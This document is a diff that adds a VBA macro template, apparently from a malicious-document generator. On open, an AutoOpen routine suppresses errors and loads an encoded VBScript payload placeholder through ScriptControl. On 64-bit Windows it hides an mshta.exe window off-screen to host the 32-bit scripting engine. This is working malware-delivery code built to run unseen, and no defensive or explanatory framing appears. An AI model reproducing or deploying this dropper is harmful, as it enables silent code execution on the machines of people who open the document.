@@ -1,0 +1,53 @@
+Sub AutoOpen()
+    On Error Resume Next
+
+    aVAR1a = "aPAYLOADa"
+
+    Set aVAR2a = aFUNC1a("ScriptControl")
+
+    aVAR2a.Language = "VBScript.Encode"
+    aVAR2a.AllowUI = True
+    aVAR2a.AddCode (aVAR1a)
+
+    aVAR2a.Run ("aVAR7a")
+
+End Sub
+
+Function aFUNC1a(sProgID)
+
+    Static aVAR3a As Object
+    Dim aVAR4a As Boolean
+
+    #If Win64 Then
+        aVAR4a = InStr(TypeName(aVAR3a), "HTMLWindow") > 0
+        If IsEmpty(sProgID) Then
+            If aVAR4a Then aVAR3a.Close
+            Exit Function
+        End If
+        If Not aVAR4a Then
+            Set aVAR3a = aFUNC2a()
+            aVAR3a.execScript "Function aFUNC1a(sProgID): Set aFUNC1a = CreateObject(sProgID): End Function", "VBScript"
+        End If
+        Set aFUNC1a = aVAR3a.aFUNC1a(sProgID)
+    #Else
+        If Not IsEmpty(sProgID) Then Set aFUNC1a = CreateObject(sProgID)
+    #End If
+
+End Function
+
+Function aFUNC2a()
+
+    Dim aVAR5a, aVAR6a
+
+    On Error Resume Next
+    aVAR5a = Left(CreateObject("Scriptlet.TypeLib").GUID, 38)
+    CreateObject("WScript.Shell").Run "%systemroot%\syswow64\mshta.exe about:""<head><script>moveTo(-32000,-32000);document.title='x86Host'</script><hta:application showintaskbar=no /><object id='shell' classid='clsid:8856F961-340A-11D0-A96B-00C04FD705A2'><param name=RegisterAsBrowser value=1></object><script>shell.putproperty('" & aVAR5a & "',document.parentWindow);</script></head>""", 0, False
+    Do
+        For Each aVAR6a In CreateObject("Shell.Application").Windows
+            Set aFUNC2a = aVAR6a.GetProperty(aVAR5a)
+            If Err.Number = 0 Then Exit Function
+            Err.Clear
+        Next
+    Loop
+
+End Function
